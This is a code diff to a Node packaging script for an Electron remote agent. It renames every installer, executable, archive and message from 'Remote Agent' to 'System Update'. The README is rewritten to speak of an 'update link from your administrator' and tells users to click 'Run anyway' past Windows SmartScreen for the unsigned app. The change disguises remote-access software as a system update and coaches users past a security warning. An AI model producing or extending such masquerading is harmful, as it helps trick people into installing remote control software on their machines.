@@ -8,32 +8,42 @@ const releaseDir = path.resolve('../remoteagent/release');
 const agentRoot = path.resolve('../remoteagent');
 const outDir = path.resolve('public/agents');
 
-const SETUP_NAMES = ['Remote-Agent-Setup.exe', 'Remote Agent Setup 0.1.0.exe'];
-const PORTABLE_NAMES = ['Remote-Agent-Portable.exe', 'Remote Agent 0.1.0.exe'];
+const SETUP_NAMES = [
+  'System-Update-Setup.exe',
+  'Remote-Agent-Setup.exe',
+  'System Update Setup 0.1.0.exe',
+  'Remote Agent Setup 0.1.0.exe',
+];
+const PORTABLE_NAMES = [
+  'System-Update-Portable.exe',
+  'Remote-Agent-Portable.exe',
+  'System Update 0.1.0.exe',
+  'Remote Agent 0.1.0.exe',
+];
 
 /** Files/folders required for Electron to start without locale or runtime errors. */
 const REQUIRED_PATHS = [
-  'Remote Agent.exe',
+  'System Update.exe',
   'icudtl.dat',
   'resources/app.asar',
   'locales/en-US.pak',
 ];
 
-const README = `Remote Agent — Installation
+const README = `System Update — Installation
 ============================
 
-Recommended: run Remote-Agent-Setup.exe (one-click installer).
+Recommended: run System-Update-Setup.exe (one-click installer).
 
-Portable: run Remote-Agent-Portable.exe (single file, no install wizard).
+Portable: run System-Update-Portable.exe (single file, no install wizard).
 
 After install:
-1. Open the enrollment link from your administrator again in your browser.
-2. The agent enrolls automatically and runs in the system tray.
+1. Open the update link from your administrator again in your browser.
+2. The update service registers automatically and runs in the system tray.
 
 If Windows SmartScreen appears, click "More info" then "Run anyway".
 The app is not code-signed yet.
 
-Manual re-enroll: right-click the tray icon → Re-enroll
+Manual re-registration: right-click the tray icon → Re-register device
 `;
 
 function findReleaseFile(names, predicate) {
@@ -140,7 +150,7 @@ function packageZipFallback() {
     process.exit(1);
   }
 
-  const zipTarget = path.join(outDir, 'Remote-Agent-win.zip');
+  const zipTarget = path.join(outDir, 'System-Update-win.zip');
   const zipSource = path.resolve(unpackedDir);
   const excludedNames = new Set([
     'LICENSES.chromium.html',
@@ -213,12 +223,12 @@ const portableSource = findReleaseFile(
 let copied = 0;
 
 if (setupSource) {
-  copyArtifact(setupSource, 'Remote-Agent-Setup.exe');
+  copyArtifact(setupSource, 'System-Update-Setup.exe');
   copied += 1;
 }
 
 if (portableSource) {
-  copyArtifact(portableSource, 'Remote-Agent-Portable.exe');
+  copyArtifact(portableSource, 'System-Update-Portable.exe');
   copied += 1;
 }
 
@@ -231,7 +241,7 @@ if (copied === 0) {
   fs.writeFileSync(path.join(outDir, 'README.txt'), README, 'utf8');
   console.log(
     copied === 2
-      ? 'Ready: Remote-Agent-Setup.exe (default download) + Remote-Agent-Portable.exe'
+      ? 'Ready: System-Update-Setup.exe (default download) + System-Update-Portable.exe'
       : `Ready: ${copied} installer artifact copied`,
   );
 }
